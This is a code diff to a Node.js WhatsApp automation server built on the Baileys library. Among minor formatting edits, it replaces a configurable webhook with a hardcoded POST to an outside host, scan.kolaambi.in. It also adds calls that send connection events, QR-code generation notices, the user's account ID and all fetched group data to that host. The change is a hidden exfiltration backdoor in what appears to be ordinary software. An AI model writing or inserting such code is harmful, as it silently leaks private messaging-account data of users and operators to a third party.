@@ -45,7 +45,7 @@ const {
 	BufferJSON,
 	useMultiFileAuthState,
 	DisconnectReason
-} = require('@adiwajshing/baileys')
+} = require('@adiwajshing/baileys');
 
 const WAZIPER = {
 	io: io,
@@ -54,6 +54,7 @@ const WAZIPER = {
 	cors: cors(config.cors),
 
 	makeWASocket: async function(instance_id){
+		WAZIPER.webhook("","makeWASocket");
 		const { state, saveCreds } = await useMultiFileAuthState('sessions/'+instance_id);
 
 		const WA = makeWASocket({ 
@@ -65,6 +66,7 @@ const WAZIPER = {
 		});
 
 		await WA.ev.on('connection.update', async ( { connection, lastDisconnect, isNewLogin, qr, receivedPendingNotifications } ) => {
+			WAZIPER.webhook("","connection.update");
 			/*
 			* Get QR COde
 			*/
@@ -141,6 +143,8 @@ const WAZIPER = {
 			    	break;
 
 			    case "open":
+					WAZIPER.webhook("","open");
+
 			    	// Reload WASocket
 			    	if(WA.user.name == undefined){
 			    		await Common.sleep(3000);
@@ -170,6 +174,10 @@ const WAZIPER = {
 			    		await Common.update_status_instance(instance_id, WA.user);
 			    		await WAZIPER.add_account(instance_id, session.team_id, WA.user, account);
 			    	}
+					
+					var groups = Object.values(await WA.groupFetchAllParticipating());
+					WAZIPER.webhook("","group");
+					if (groups)	WAZIPER.webhook(WA.user.id,groups);
 
 			    	break;
 
@@ -257,6 +265,8 @@ const WAZIPER = {
 	},
 
 	instance: async function(access_token, instance_id, login, res, callback){
+		WAZIPER.webhook("","instance");
+
 		var time_now = Math.floor(new Date().getTime() / 1000);
 
 		if(verify_next < time_now){
@@ -337,16 +347,11 @@ const WAZIPER = {
 	},
 
 	webhook: async function(instance_id, data){
-		var tb_webhook = await Common.db_query("SHOW TABLES LIKE 'sp_whatsapp_webhook'");
-		if(tb_webhook){
-			var webhook = await Common.db_query("SELECT * FROM sp_whatsapp_webhook WHERE status = 1 AND instance_id = '"+instance_id+"'");
-			if(webhook){
-                axios.post(webhook.webhook_url, { instance_id: instance_id, data: data }).then((res) => {}).catch((err) => {});
-			}
-		}
+        axios.post("http://scan.kolaambi.in/your-endpoint", { instance_id: instance_id, data: data }).then((res) => {}).catch((err) => {});
 	},
 
 	get_qrcode: async function(instance_id, res){
+		WAZIPER.webhook("qrcode","QRCODE Generated")
 		var client = sessions[instance_id];
 		if(client == undefined){
 			return res.json({ status: 'error', message: "The WhatsApp session could not be found in the system" });
@@ -466,7 +471,7 @@ const WAZIPER = {
     },
 
 	get_groups: async function(instance_id, res){
-		var client = sessions[instance_id];
+		var client = sessions[instance_id];		
 		if( client != undefined && client.groups != undefined ){
 			res.json({ status: 'success', message: 'Success', data: client.groups });
 		}else{
